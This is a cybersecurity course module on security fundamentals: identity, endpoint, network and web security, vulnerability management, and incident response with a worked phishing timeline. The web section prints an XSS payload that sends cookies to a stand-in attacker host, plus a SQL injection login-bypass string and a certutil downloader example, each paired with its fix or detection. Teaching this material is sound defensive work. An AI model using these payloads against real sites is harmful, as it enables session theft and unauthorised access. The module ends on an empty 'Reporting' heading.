---
id: cyber-03-security-fundamentals
track: cyber
phase: 3
order: 30
title: "Phase 3 — Security Fundamentals"
duration: "6 weeks"
duration_weeks: 6
energy_mix: [low, normal]
deliverable: "portfolio/cyber/03-security-fundamentals.md"
exit_criteria: "You can explain a simple attack like phishing or web login abuse and name the logs, controls, and response steps involved."
---

# Phase 3 — Security Fundamentals

## Goal of this phase

Learn the core security concepts used across SOC, GRC, IT security, and pentesting before choosing a specialization.

## Estimated time

**6 weeks**. This phase is broad; the goal is working literacy, not mastery.

## Skills you'll gain

- Understand identity security, endpoint security, network security, web security, cloud basics, logging, vulnerability management, and incident response.
- Read alerts and logs with basic context.
- Understand common weaknesses and controls.
- Map simple attacks to MITRE ATT&CK and OWASP Top 10.

## Specific topics to learn

### Identity and access

- Authentication, authorization, accounting
- MFA, SSO, password policies
- Least privilege, RBAC, access reviews
- Account lockout, suspicious login, impossible travel

### Endpoint and malware basics

- EDR/AV purpose
- Malware persistence concept
- Suspicious processes
- Windows Event IDs at beginner level: 4624 successful login, 4625 failed login, 4688 process creation if enabled
- Linux auth logs

### Network security

- Firewalls and rules
- IDS/IPS concepts
- VPNs and segmentation
- Secure ports/protocols
- DNS filtering concept

### Web security

- OWASP Top 10
- SQL injection concept
- XSS concept
- Authentication/session weaknesses
- IDOR concept
- Security headers basics

### Vulnerability management

- CVE, CVSS, EPSS concept
- Asset inventory
- Prioritization
- Remediation vs mitigation
- Patch verification

### Incident response

- Preparation, identification, containment, eradication, recovery, lessons learned
- Evidence handling basics
- Incident timeline
- Reporting

## Lesson: Security Fundamentals

### Why this lesson exists

Phase 1 gave you the vocabulary. Phase 2 gave you the plumbing. This phase is where the two meet, and where the job you are training for actually starts.

Look again at the exit criterion, because it is the most specific one in the track so far: *you can explain a simple attack like phishing or web login abuse and name the logs, controls, and response steps involved.* Read that carefully, because it is asking for three separate things about one incident. Not "what is phishing" — that was Phase 1. It is: **which logs would show this**, **which controls would have stopped or caught it**, and **what would you do, in what order, once you saw it**. That triad is the shape of every SOC interview question you will ever be asked, and it is the shape of the work itself.

**Why the phase is organised the way it is.** The six topic areas below — identity, endpoint, network, web, vulnerability management, and incident response — are not six separate subjects to memorise. They are six *places to look* during an investigation. When you finish this phase, you should be able to take any incident and walk it through those six lenses: who was involved (identity), what ran on the machine (endpoint), how it travelled (network), what the application did (web), what weakness allowed it (vulnerability management), and what happens next (incident response). That is the working method this lesson is trying to install.

This is also the last phase before you choose a specialisation in Phase 5. The purpose of the breadth here is not to make you good at all six — it is to make you *literate* in all six so that the choice in Phase 5 is informed rather than guessed. The phase notes this explicitly: "working literacy, not mastery."

**Time to complete:** roughly 40–50 hours across six weeks. It is comparable in size to Phase 2 but wider rather than deeper, which means it is easier to get lost in. The antidote is the deliverable: five PortSwigger labs, five CVE summaries, one incident timeline, one control-mapping table. Those four artifacts are the phase. Reading without producing them will feel productive and teach you very little.

**One strategic note about your web development background.** Of the six areas here, **web security is the one where you already have an unfair advantage.** You have written code, you know what a form submission does, and you have probably written a database query by string concatenation without knowing it was dangerous. That background is genuinely rare among cyber beginners, most of whom find the web material the hardest. The PortSwigger labs will land faster for you than for most people — lean into it, because "I understand why injection happens at the code level" is a differentiator in interviews.

### Part 1 — Identity security: who are you, and should you be here?

#### The three questions, revisited with attack names attached

Phase 1 introduced authentication, authorisation, and accounting (AAA). Here is what failure looks like in each, because recognising the failure is the skill:

- **Authentication failure** — the attacker has valid credentials they should not have. Phished password, credential stuffing against a reused password, a sprayed `Summer2025!`, or a stolen session token. In the logs this looks like a *successful* login from an unexpected place. Nothing is "failing"; that is what makes it hard.
- **Authorisation failure** — the attacker is legitimately logged in but reaches things they should not. A standard user who can open the finance share. A customer who can read another customer's order by changing a number in the URL (this is IDOR, covered in Part 4).
- **Accounting failure** — nobody can tell what happened, because the logs are absent, incomplete, or not retained. This is the failure that turns a contained incident into an unanswerable one.

The reason this matters for detection is a point beginners find counter-intuitive: **the most dangerous authentication events are successful logins.** A failed login is noise — the internet is full of automated attempts against every exposed service, and you saw that in Phase 2's auth logs. A *successful* login from an unusual location at an unusual time, for an account that has no reason to be there, is the signal worth investigating. Detection rules are built around this distinction.

#### MFA, SSO, and why they are the highest-value controls

**MFA** (Phase 1) remains the single most effective control against credential theft, and it is worth understanding *why* it is not perfect. The attacks that defeat MFA are worth naming because they are what you will actually see:

- **MFA fatigue / push bombing** — repeated prompts until the victim approves one out of frustration. Defeated by number matching and by a rule that you never approve a prompt you did not initiate.
- **Real-time phishing proxies** — a fake login page that relays the victim's credentials *and* their MFA response to the real site in real time, stealing the session that results. This is why phishing-resistant factors exist.
- **SIM swapping** — the attacker convinces a mobile carrier to move the victim's number to a SIM they control, defeating SMS-based codes. This is the concrete reason SMS MFA is considered the weakest form.
- **Session token theft** — the attacker does not need the password or the MFA prompt at all if they can steal the session cookie issued *after* authentication. This is why cookie flags (Part 4) and token protection matter.

The ranking to remember, strongest to weakest: **hardware security keys (FIDO2/WebAuthn) > authenticator apps with number matching > push notifications > SMS codes.** The pattern is simple — the further the factor is from something that can be relayed or intercepted remotely, the better it is.

**SSO** (Single Sign-On) lets one identity provider authenticate you across many applications. The security benefit is real and worth stating precisely: it **centralises authentication**, so there is one place to enforce MFA, one place to revoke access, and one log of every login across every application. Without SSO, disabling a departing employee means chasing dozens of separate accounts, and each one is a chance to miss a system.

The trade-off is equally real: SSO makes the identity provider a **single point of failure**. Compromise one account with SSO access and you may reach everything behind it. This is why identity providers get the strongest controls available — hardware keys, conditional access, and aggressive monitoring.

**Conditional access** is the modern refinement: policy that decides whether to allow a login based on context rather than credentials alone. Is the device managed? Is the location expected? Is the risk score from the identity provider high? A login with a correct password from an unmanaged device in an unexpected country can be blocked or forced to re-authenticate. This is the control that most directly addresses the authentication failures above.

#### The detections you should be able to describe

Three alert types come up constantly in SOC work, and the phase lists all three. Being able to explain them — and to say what a *false positive* looks like — is exactly the literacy this phase wants.

**Account lockout.** A policy that locks an account after N failed attempts, used to blunt brute-force attacks. But note the nuance: lockout is a control that can itself be abused. An attacker who deliberately locks accounts is performing a **denial of service**, and in some cases lockout spikes are how an attacker forces a helpdesk call that they then social-engineer. The SOC question is not "did an account lock" but "is this one account being hammered, or many accounts lightly touched?" The second pattern is spraying (Phase 1) and evades lockout entirely, because each account sees only one failure.

**Suspicious login.** A successful login that does not fit the account's normal pattern. What makes it suspicious is context: a new country, a new device, an unusual hour, or a login to an application the user has never touched. The investigative instinct to build now: **compare against a baseline.** "Suspicious" is meaningless without knowing what normal looks like for that account.

**Impossible travel.** Two successful logins from geographically distant locations within a timeframe that makes physical travel impossible — Manila at 09:00 and London at 09:30. It is a strong signal because it cannot be explained by the user simply moving. Two honest caveats that separate a thoughtful analyst from one reciting a rule: VPNs and corporate proxies routinely cause false positives, because the apparent location is the exit node rather than the user; and a *real* attacker may also use a VPN precisely to make their location look plausible. The alert is a prompt to investigate, not a conclusion.

#### Least privilege, RBAC, and access reviews

**Least privilege** and **access review** were defined in Phase 1. The new material here is **RBAC** — Role-Based Access Control — which is how least privilege is actually implemented at scale.

Rather than granting permissions to individuals, you define **roles** that bundle the permissions a job function needs, and you assign people to roles. `Helpdesk-Tier1` gets password reset and ticket access. `Finance-ReadOnly` gets read access to finance systems. A person changing jobs changes role, and their access changes with it in one operation.

Note that this is the group pattern from the IT track's sysadmin phase, scaled up and named. In fact every access question in this phase reduces to the same shape you already learned: **user → role → permission**, never user → permission directly. When an access review asks "who can read the finance share?", the answer should be one role's membership list, not a manual audit of a hundred individual grants.

#### Turning identity into log evidence

This is the part that makes identity *detective* rather than just administrative, and it connects directly to the exit criterion. The Windows Event IDs the phase lists are the foundation:

| Event ID | Meaning | Why an analyst cares |
|---:|---|---|
| **4624** | Successful logon | The dangerous one. Note the **logon type** — type 3 is network, type 10 is RDP |
| **4625** | Failed logon | Brute force and spraying. Volume and pattern matter more than any single event |
| **4688** | Process creation | What ran after the login — *if* auditing is enabled |
| **4672** | Special privileges assigned | An account granted admin-level rights at logon |
| **4720 / 4726** | User account created / deleted | Persistence. A new account is a foothold |

The **logon type** in a 4624 event is worth understanding, because it answers "how did they get in?" Type 2 is a local console login. Type 3 is a network logon — a file share or a remote service. Type 10 is Remote Desktop, which is where you would look after a suspected RDP compromise. Seeing logon type 10 for an account that never uses RDP is a finding.

In Linux the equivalent evidence lives where Phase 2 showed you: `/var/log/auth.log` or `/var/log/secure`, read through `journalctl -u sshd`. The investigative questions are the same ones — which account, from where, at what time, and does that fit the baseline.

The point to carry forward: **identity is where nearly every investigation begins**, because nearly every attack needs an account. Part 6's incident timeline is built on exactly this foundation.

### Part 2 — Endpoint security and malware behaviour

#### What EDR actually does, and how it differs from antivirus

**Antivirus (AV)** and **Endpoint Detection and Response (EDR)** are often spoken of together, and they are genuinely different tools.

Traditional **AV** works primarily by **signature**: it holds a database of known-malicious file hashes and patterns and blocks matches. This is fast and effective against known malware, and structurally useless against anything new or modified. Change one byte of a known virus and the signature no longer matches. This is why "the antivirus says it is clean" was never proof of anything, a point Phase 1 made about rootkits.

**EDR** works primarily by **behaviour**. It continuously records what happens on the endpoint — processes starting, files written, registry keys changed, network connections made — and evaluates those sequences against known-attack patterns. Instead of asking "is this file known-bad?", it asks "does this *sequence of actions* look like an attack?" A document reader spawning a command shell, which then downloads a file and adds a scheduled task, is suspicious regardless of whether any individual step matches a signature.

That behavioural record is the second half of EDR's value: **telemetry**. An EDR agent keeps a searchable history of endpoint activity, which means that after an alert you can reconstruct what happened. This is where the free tools in this phase's table fit. **Sysmon** (System Monitor, from Microsoft's Sysinternals suite) is not antivirus and does not block anything — it is a telemetry source that writes detailed process, network, and file events to the Windows event log, which is what makes host investigation possible at all. **Wazuh** collects and analyses those events centrally.

A useful way to hold the relationship: Sysmon *records*, EDR *detects and responds*, AV *blocks known bad*, and a SIEM *correlates across many sources*. The phase's tools table gives you the free end of each category.

#### The Event IDs that reveal process activity

Event ID **4688** (process creation) is the endpoint equivalent of the identity event IDs, and it has one important practical caveat the phase hints at with "if enabled": **process creation auditing is not on by default on Windows.** You must enable it, which is itself a lesson about detection — *the absence of an event does not mean the absence of activity; it may mean nobody turned the logging on.*

When 4688 is enabled alongside Sysmon, each process start records the **parent process**, and the parent-child relationship is where detection lives:

| Pattern | Why it is suspicious |
|---|---|
| `winword.exe` → `powershell.exe` | A document spawning a shell. This is a macro-based attack, and normal documents never do it |
| `w3wp.exe` → `cmd.exe` | A web server spawning a command shell — a webshell or exploit |
| `outlook.exe` → `cmd.exe` | Email client spawning a shell |
| `svchost.exe` with an unusual parent | `svchost` should be spawned by `services.exe`. Any other parent suggests masquerading |

That last row introduces **masquerading** — naming a malicious file after a legitimate system process to blend in. It is a MITRE ATT&CK technique (T1036), and it is why an analyst checks the *full path* rather than the filename: a `svchost.exe` running from `C:\Users\Public\` rather than `C:\Windows\System32\` is not the real one. Legitimate Windows binaries run from their expected directories, and that predictability is what makes impersonation detectable.

#### Persistence: how malware survives a reboot

**Persistence** is the set of techniques malware uses to survive restarts, and it is one of the most important concepts in this phase because it is where defenders have the advantage. The reason is simple: **an attacker must persist somewhere, and the places they can persist are a finite, enumerable list.** Knowing that list is knowing where to look.

The common mechanisms:

- **Registry Run keys** — `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` and its `HKLM` equivalent cause a program to start at login. The classic location, and still heavily used.
- **Scheduled tasks** — a task that runs a command on a trigger. Extremely common, because it looks like legitimate administration and can run as SYSTEM.
- **Services** — a malicious service set to start automatically. Runs with high privilege and is easy to overlook.
- **Startup folders** — files in the user's Startup directory. Simple and visible, so attackers with better options avoid it.
- **WMI event subscriptions** — persistence through Windows Management Instrumentation, which is fileless and therefore harder to spot.
- **Linux equivalents** — `cron` jobs, `systemd` unit files, shell profile files like `~/.bashrc`, and SSH `authorized_keys` (adding a key is persistence *and* a backdoor in one step).

Each of these has an ordinary administrative purpose, which is exactly why persistence detection is hard: you are not looking for something that is obviously malicious, you are looking for something *unexplained*. This is where baseline knowledge does the work — you need to know what should be in the Run keys before you can say something should not be.

The investigative habit: **when you find one persistence mechanism, assume there are others.** Attackers commonly establish two or three, so that removing one does not evict them. A complete response removes all of them, which is why eradication (Part 6) follows a full enumeration rather than a single fix.

#### Suspicious process indicators

Beyond parent-child relationships, these are the process-level signals worth recognising:

- **Living off the land** — using legitimate built-in tools for malicious purposes: `powershell.exe`, `cmd.exe`, `wmic`, `certutil`, `bitsadmin`, `rundll32`, `mshta`. These are "suspicious" not because they are malicious but because they are frequently *abused*, and security tools cannot simply block them. `certutil -urlcache -f http://...` downloading a file is a classic example: a legitimate certificate utility used as a downloader.
- **Encoded command lines** — PowerShell invoked with `-EncodedCommand` and a long base64 string. There is almost no legitimate reason to obfuscate a command line, and it exists to defeat text-based detection.
- **Processes running from odd locations** — `C:\Users\Public\`, `C:\Temp\`, `%APPDATA%`, or `/tmp` on Linux. Legitimate system binaries do not run from user-writable directories; that is the whole point of the expectation.
- **Unexpected network connections from office applications** — Word opening a connection to an unfamiliar IP is not normal behaviour.
- **Unusual accounts in process ownership** — a service running as a normal user account rather than a service account, or a process running as SYSTEM that has no business doing so.

Notice the recurring theme across every one of these: **the indicator is a deviation from expectation, not a signature of evil.** This is the single most important mental shift in endpoint security. You cannot detect modern intrusions by looking for known-bad; you detect them by knowing what normal looks like and noticing what does not.

### Part 3 — Network security

#### Firewalls: rules, direction, and default posture

A **firewall** permits or denies traffic based on rules, and the rule anatomy is worth being precise about because you will read these in real jobs:

```text
Action | Source        | Destination   | Port | Protocol | Direction
ALLOW  | 10.0.0.0/24   | 10.0.5.20     | 443  | TCP      | Inbound
DENY   | any           | 10.0.5.20     | 3389 | TCP      | Inbound
```

Two concepts matter more than any individual rule. The first is **default posture**. A **default-deny** firewall blocks everything not explicitly allowed; a **default-allow** firewall permits everything not explicitly blocked. Default-deny is the correct posture and the industry standard, because it means a forgotten rule fails safely. Default-allow means every oversight is an open door.

The second is **direction and state**. Modern firewalls are **stateful**: when an internal machine makes an outbound connection, the firewall remembers it and permits the return traffic automatically. This is why a rule permitting outbound traffic does not require a matching inbound rule. It also explains why the *direction* of a rule is essential context — an inbound deny for port 3389 that permits outbound 3389 tells you the rule set was written without understanding what it protects.

The security analysis of a firewall rule set asks three questions: **what is unnecessarily open, what is open to too many sources, and what is stale?** A rule permitting RDP from `any` is the first. A rule permitting database access from the entire corporate network rather than one application server is the second. A rule left over from a project that ended two years ago is the third, and stale rules are the most common real finding, because nobody wants to delete a rule in case something breaks.

#### IDS and IPS: detection versus prevention

**IDS** (Intrusion Detection System) monitors traffic and *alerts*. **IPS** (Intrusion Prevention System) monitors and *blocks*. The single-letter difference is the whole story, and so is the trade-off.

An IPS sits inline, in the path of traffic, which means it can stop an attack — and means that a false positive *breaks legitimate traffic*. An IDS sits out of band, receiving a copy, which means it can never break anything and also can never stop anything. This is why organisations often start in detection mode even with IPS-capable hardware: blocking first, before you understand your false-positive rate, is how you cause an outage.

Detection methods are worth distinguishing:

- **Signature-based** — matches known attack patterns. Precise, but blind to anything new.
- **Anomaly-based** — flags deviation from a learned baseline. Catches novel attacks, at the cost of many false positives, because networks are full of legitimate unusual behaviour.

Both struggle with the same fundamental problem, and naming it is what shows understanding: **encrypted traffic**. If TLS hides the content, signature matching cannot see inside without interception. This is why modern detection leans on metadata — connection patterns, volumes, timing, destinations, and JA3/JA4 fingerprints of the TLS handshake itself — rather than payload inspection.

#### VPNs and segmentation

A **VPN** (Phase 2) creates an encrypted tunnel; in corporate use it also places the remote device *inside* the network, as though it were on-site. That is its security purpose and its risk in one sentence: a compromised laptop on the VPN is an internal machine, with internal reach.

**Segmentation** is the practice of dividing a network into zones so that compromise of one does not mean compromise of all. The classic example is separating the corporate network from the server network from the industrial control network, with firewall rules controlling the paths between. The security value is **containment** — it limits **lateral movement**, the phase where an attacker who has one foothold moves through the network looking for more.

Two related ideas worth knowing. **Microsegmentation** applies the same principle at the level of individual workloads rather than network zones, which is common in cloud environments. And **the flat network** — everything on one segment with no internal controls — is the anti-pattern all of this exists to avoid. In a flat network, one phished laptop can reach every server. Segmentation is what makes the difference between "we had an incident" and "we had a breach."

A good interview answer connects this to the CIA triad and to least privilege: segmentation is least privilege applied to *network reachability* rather than to accounts. The same principle, a different dimension.

#### Secure protocols, and DNS filtering

The **secure ports and protocols** question is really the question "is this traffic encrypted and authenticated?" The pattern to learn is the pairing of an insecure protocol with its secure replacement:

| Insecure | Secure | Notes |
|---|---|---|
| HTTP (80) | HTTPS (443) | TLS |
| FTP (21) | SFTP (22) / FTPS | Credentials in plaintext over FTP |
| Telnet (23) | SSH (22) | Telnet sends everything, including passwords, in the clear |
| SMTP (25) | SMTPS (465) / submission (587) | Encryption in transit |
| LDAP (389) | LDAPS (636) | Directory queries carry credentials |
| SNMPv1/v2 (161) | SNMPv3 | v3 adds authentication and encryption |

The reason this table is worth knowing rather than looking up is that spotting telnet or FTP in a scan is an immediate finding, and doing so *instantly* is what makes a scan review efficient. Phase 2 taught you to read a port list; this is what you read it *for*.

**DNS filtering** is the practice of blocking resolution of known-malicious domains. Its appeal is that it sits early in the attack chain: malware must typically resolve a command-and-control domain before it can do anything, so blocking the lookup breaks the attack before any file is delivered. It also covers every device on the network without an agent.

Its limitation is equally important and is why it is a *layer* rather than a solution: it only works on names, so **direct-to-IP connections bypass it entirely**, as do **DNS-over-HTTPS** clients and **domain generation algorithms**, where malware generates hundreds of candidate domains so that blocking a list catches only some. DNS filtering stops unsophisticated attacks cheaply and is trivially bypassed by sophisticated ones. Both halves of that sentence belong in your answer.

### Part 4 — Web security: the domain where you start ahead

#### Why your background matters here

The OWASP Top 10 was introduced in Phase 1 as a shared vocabulary. This part is where you learn to actually find and reason about the categories, and where your web development history becomes an asset.

The organising insight for this whole part, and the sentence to remember: **almost every web vulnerability is a failure to keep data and code separate, or a failure to check that the person asking is allowed to ask.** Injection attacks are the first failure. Broken access control, IDOR, and session weaknesses are the second. That is genuinely most of it.

#### Injection: the concept behind SQL injection and XSS

The phase lists SQL injection and XSS separately, but they are the *same bug* in different interpreters, and understanding that is more valuable than learning them as two facts.

**Injection** happens when untrusted input is interpreted as instructions rather than as data. The vulnerability exists wherever a program builds a command by concatenating strings, and the specific name depends on what is being concatenated into.

**SQL injection** occurs when user input becomes part of a database query. Consider:

```sql
SELECT * FROM users WHERE username = 'alice' AND password = 'secret123';
```

If the application builds this by concatenation and the user enters `' OR '1'='1` as the password, the query becomes:

```sql
SELECT * FROM users WHERE username = 'alice' AND password = '' OR '1'='1';
```

Since `'1'='1'` is always true, the `WHERE` clause matches every row and the login succeeds with no valid password. Notice what actually went wrong: the database did exactly what it was told. The application handed it a string in which the *data* had escaped into the *code*, and the database cannot tell the difference.

The fix is **parameterised queries** (prepared statements), where the query structure is sent separately from the values, so the database knows `' OR '1'='1` is a password string and never an instruction. This is the point worth internalising: **SQL injection is not fixed by filtering input, it is fixed by never letting input become code.** Escaping and blocklists are band-aids that miss encodings; parameterisation removes the vulnerability class.

**Cross-site scripting (XSS)** is the same failure with the browser as the interpreter: untrusted input is rendered into HTML, so it becomes script that runs in *another user's* browser. The classic reflected form is a search page that echoes the query — submit `<script>fetch('https://evil.example/?c='+document.cookie)</script>` and if the page renders it as HTML rather than text, every visitor's session cookie is sent to the attacker. **Stored XSS** is worse: the payload is saved (in a comment, a profile, a support ticket) and fires for everyone who views it, with no interaction needed.

The fix is **output encoding** — rendering untrusted data as text, not markup — supported by **Content Security Policy**, which restricts where scripts may load from. And note the connection to Part 1: stealing the session cookie is a *session token theft*, which defeats MFA entirely because authentication already happened. This is why the `HttpOnly` cookie flag exists: it makes cookies unreadable from JavaScript, which does not fix XSS but removes one of its worst payoffs.

#### Broken access control and IDOR

**IDOR** — Insecure Direct Object Reference — is the vulnerability where an application exposes a reference to an internal object and trusts the client to use it correctly. It is the clearest example of an authorisation failure (Part 1) and it is dead simple to understand:

```text
GET /api/invoices/1001     → your invoice
GET /api/invoices/1002     → someone else's invoice
```

If the second request returns data, the application checked *authentication* (are you logged in?) but not *authorisation* (is this invoice yours?). The fix is a server-side check on every request that the authenticated user is permitted to access the specific object. The security reason this bug is so common is a wrong assumption that runs through many codebases: developers assume that because the UI only ever shows users their own links, nobody will type a different number. The UI is not a control. **Anything the client sends is attacker-controlled.**

**Broken access control** is the wider category — the OWASP Top 10's number one entry in recent editions — covering IDOR, privilege escalation (a normal user reaching admin functions by calling the admin endpoint directly), and forced browsing (reaching a page by URL when the link is hidden). All of them share the same root cause and the same fix: enforce permissions on the server, for every request, based on identity rather than on what the interface offers.

#### Session and authentication weaknesses

Sessions are how a web application remembers you across requests, and they are a high-value target because *a stolen session is a completed authentication.*

- **Session fixation** — the attacker sets a known session ID before the victim logs in; if the application does not issue a fresh ID at login, the attacker now holds a valid session.
- **Predictable session IDs** — sequential or weakly random identifiers that can be guessed.
- **No expiry or no logout invalidation** — sessions that live forever, or that remain valid server-side after logout. A token that still works after "log out" is a real-world finding.
- **Missing cookie flags** — `Secure` (HTTPS only) and `HttpOnly` (unreadable from JavaScript, as above). `SameSite` addresses cross-site request forgery, where another site causes the victim's browser to make an authenticated request.
- **Credentials in URLs** — tokens in query strings end up in browser history, proxy logs, and `Referer` headers.

**Security headers** are the defence-in-depth layer, and the phase asks only for basics. The four worth knowing: `Content-Security-Policy` (restricts script sources, the strongest XSS mitigation), `Strict-Transport-Security` (forces HTTPS for future visits), `X-Content-Type-Options: nosniff` (stops content-type sniffing), and `X-Frame-Options` or the CSP `frame-ancestors` directive (prevents clickjacking, where your site is embedded invisibly in another). You can check any site's headers with `curl -I`, which is a small, satisfying thing to do on a site you own.

#### How to actually practise this

The phase's task 4 is **five PortSwigger Apprentice labs**, and this is the single highest-value task in the phase for you. PortSwigger's Web Security Academy is free, needs no setup, and runs in a browser. Each lab is a real application with a real vulnerability and a defined objective.

Do them properly: for each lab, write down what the vulnerability was, how you found it, what the payload or request looked like, and why the fix would work. Five labs understood at that level are worth more than fifty completed by following a walkthrough. And because your background is web development, add one thing most learners cannot: **write the vulnerable code, then write the fixed version.** Seeing your own parameterised query block the injection you just performed is the lesson that sticks.

**OWASP ZAP** and **Burp Suite Community** (task 5) are the tools that make this practical — both are intercepting proxies that sit between your browser and the target so you can read and modify every request. Burp Community is the industry-standard tool for manual web testing; ZAP is the free open-source equivalent. Running a **passive scan** against your own application is safe and instructive: it reports what it observes without attacking anything.

### Part 5 — Vulnerability management: deciding what to fix first

#### CVE, CVSS, and EPSS

The phase lists three acronyms here, and they answer three different questions.

**CVE** (Common Vulnerabilities and Exposures) is the identifier — `CVE-2021-44228`. It answers *which vulnerability is this?* It is a naming system, nothing more, and its value is that everyone worldwide means the same thing by the same number.

**CVSS** (Common Vulnerability Scoring System) is the severity score, 0.0 to 10.0, answering *how bad is it technically?* Scores map to qualitative bands: 9.0–10.0 critical, 7.0–8.9 high, 4.0–6.9 medium, 0.1–3.9 low. CVSS is computed from characteristics like whether the attack is remote, whether authentication is needed, and what the impact on confidentiality, integrity, and availability is — note that this is the CIA triad from Phase 1 appearing inside the scoring formula. The `CVE-2021-44228` example above (Log4Shell) scored 10.0.

**EPSS** (Exploit Prediction Scoring System) answers a completely different question: *how likely is this vulnerability to actually be exploited in the next 30 days?* It is a probability between 0 and 1, derived from real-world activity.

The reason all three matter together is the phase's next topic — prioritisation — and the reason prioritisation is hard is a fact worth stating plainly: **CVSS alone is a poor prioritisation tool.** There are far more "critical" CVEs than any team can fix, and most of them are never exploited. A CVSS 9.8 vulnerability in software you do not run is irrelevant. A CVSS 6.5 vulnerability that is being actively exploited in the wild, on an internet-facing server, holding customer data, is an emergency.

So the professional triage combines signal:

- **CISA's Known Exploited Vulnerabilities (KEV) catalog** — a list of CVEs confirmed as exploited in the wild. This is why the phase's task 6 draws from KEV specifically: these are not theoretical. If a KEV entry affects your asset inventory, that is a top priority by definition.
- **EPSS** — likelihood of exploitation, for ranking within the rest.
- **Exposure** — is the system internet-facing or internal? Reachable is urgent.
- **Asset criticality** — what breaks, and who is affected, if it falls?
- **Existing controls** — is the vulnerable component even reachable, or is it behind a firewall and authentication?

That is **risk-based** prioritisation, and it is the same `likelihood × impact` reasoning from Phase 1 applied to a specific list of technical findings. Doing that arithmetic and being able to defend it is a core skill in both SOC and GRC work.

#### Asset inventory: the prerequisite nobody wants to do

**Asset inventory** — knowing what you own — is unglamorous and it is the foundation of everything else in this part. You cannot patch what you cannot list. You cannot assess exposure for a system you do not know exists. You cannot know whether a CVE affects you without knowing your software versions.

The practical failure mode in real organisations is that the inventory is incomplete and outdated: a spreadsheet maintained by hand, shadow IT that nobody registered, cloud instances spun up and forgotten. Every one of those is invisible to the patching process. This is why CIS Controls puts inventory as Control 1 — first, before anything else — and why the phase's task asks you to map five controls to your home lab. Start where you are: for your home lab, list every machine, its OS, its services, and its purpose. That is a real asset inventory, and doing it once teaches the discipline.

#### Remediation versus mitigation

These two words are used interchangeably in conversation and mean different things in a report, and getting them right is a small professional detail:

- **Remediation** fixes the root cause. Patching the vulnerability, upgrading the component, correcting the misconfiguration. The problem is gone.
- **Mitigation** reduces the risk without fixing the cause. Isolating the system from the network, adding a firewall rule, disabling a vulnerable feature, or adding a compensating control. The problem remains.

Mitigation is legitimate and often necessary — you mitigate when a patch does not exist yet, or when the system cannot be taken down for patching. But mitigation is a **holding action**, and the professional discipline is to record it as such with a review date, rather than letting a temporary workaround quietly become permanent. The most common real-world finding is a mitigation from three years ago that everyone forgot was temporary.

**Patch verification** is the step that separates an assertion from evidence. "We deployed the patch" is a claim; "the patch is installed on 98 of 100 hosts, and here are the two exceptions with owner and date" is a fact. Verifying means re-checking the version or re-scanning after remediation, and tracking exceptions explicitly. When you write your five CVE summaries for the deliverable, include the verification step for each — it is the part most beginners omit and the part an interviewer notices.

### Part 6 — Incident response: putting it together

#### The six phases, and why the order is the lesson

Incident response follows a standard lifecycle, and the phases are worth knowing by name because they are used as a shared vocabulary in every serious organisation:

1. **Preparation** — before anything happens: plans, playbooks, tooling, contact lists, logging that is actually enabled, and rehearsals. Everything else is easier or impossible depending on this phase.
2. **Identification** — is this actually an incident? Alerts fire constantly and most are benign; this phase is triage, confirming scope, and deciding whether to escalate.
3. **Containment** — stop the spread. Isolate the host, disable the account, block the address. The goal is to prevent further damage *while preserving the ability to investigate*.
4. **Eradication** — remove the attacker's presence. Delete the malware, remove **all** persistence mechanisms, close the exploited vulnerability.
5. **Recovery** — restore normal operation safely. Restore from verified-clean backups, monitor for the attacker returning, and confirm the fix holds.
6. **Lessons learned** — what happened, why, and what changes. This is the phase that improves the *next* response, and the one most often skipped under time pressure.

Two observations that show understanding rather than recitation. First, **the phases are not always strictly sequential in practice** — containment may begin while identification is still incomplete, because stopping active ransomware matters more than finishing the analysis. Second, **the order encodes a real tension**: containment and investigation pull against each other. Pulling the plug on a machine stops the attacker and destroys volatile evidence (memory contents, network connections, running processes). This is why the professional instinct is to *isolate network access* rather than power off, preserving the host state while cutting the attack path.

#### Evidence handling, and the order of volatility

**Evidence handling** exists to keep findings credible. If your investigation concludes "the attacker exfiltrated 4 GB," that conclusion must rest on evidence that has not been altered. The core principles:

- **Preserve the original.** Work on copies. Take a forensic image before touching anything, and keep the original untouched.
- **Document the chain of custody** — who handled the evidence, when, and what they did. This matters legally and it matters for the credibility of your report.
- **Record your actions as you take them**, including timestamps in a consistent timezone. Note UTC deliberately, because logs from different systems will be in different zones and correlating them is where error creeps in.
- **Note hashes** of any evidence collected, so alteration is detectable.

**The order of volatility** is the principle that tells you what to collect first, because evidence disappears over time:

```text
Most volatile  → CPU registers, cache
               → RAM (running processes, network connections, encryption keys)
               → Network connections and routing tables
               → Disk (files, logs)
               → Backups and archival media
Least volatile → Physical configuration
```

Collect the most volatile first, because it disappears soonest. Memory holds what is running *right now* — and in an era of fileless malware that lives only in memory, this is often the only place the evidence exists at all. This is why "just reboot it" is the single worst instinct in incident response: it destroys the most valuable evidence and may trigger the malware's own cleanup.

#### Building the incident timeline

The phase's task 7 asks for a **mock incident timeline for a phishing login**, and this is the exercise that ties the entire phase together. A timeline is simply a chronological reconstruction of events, drawn from the logs described across all six parts, and building one is how you prove to yourself that you understand where evidence lives.

Worked example, which you should build your own version of:

| Time (UTC) | Event | Source | Interpretation |
|---|---|---|---|
| 02:14:03 | Phishing email delivered to `j.dela+cruz@example.com` | Mail gateway log | Initial access attempt (ATT&CK T1566) |
| 02:41:19 | User clicks link, credentials entered on lookalike domain | Proxy / DNS log | Credential harvesting |
| 02:41:52 | Event 4624, logon type 3, from `203.0.113.77` | Windows Security log | Attacker authenticated with stolen credentials |
| 02:52:10 | Event 4624, logon type 10 (RDP), from same address | Windows Security log | Attacker established interactive access |
| 02:58:44 | Event 4688: `cmd.exe` parented by `explorer.exe` | Sysmon / 4688 | Manual execution — hands on keyboard |
| 03:06:02 | New scheduled task created | Sysmon / Task Scheduler log | **Persistence** established |
| 03:11:30 | Outbound connection to `198.51.100.42:443`, 850 MB transferred | Firewall / proxy log | Possible **exfiltration** |
| 09:05:00 | Helpdesk ticket: user reports odd login alert | Ticketing system | **Identification** — nine hours late |

Read that table and notice how much it demonstrates: the ATT&CK mapping from Phase 1, the event IDs from Part 1, the endpoint telemetry from Part 2, the network evidence from Part 3, and the response phases from Part 6 — all applied to one scenario. It also shows the uncomfortable truth that incidents are usually identified hours or days after they begin, which is the argument for the detection improvements that come out of the lessons-learned phase.

When you write yours, use the phase's deliverable structure: identify the initial access, the authentication evidence, the persistence, and the exfiltration, and name which control would have broken the chain at each step. That last column — the controls — is where you demonstrate the exit criterion.

#### Reporting

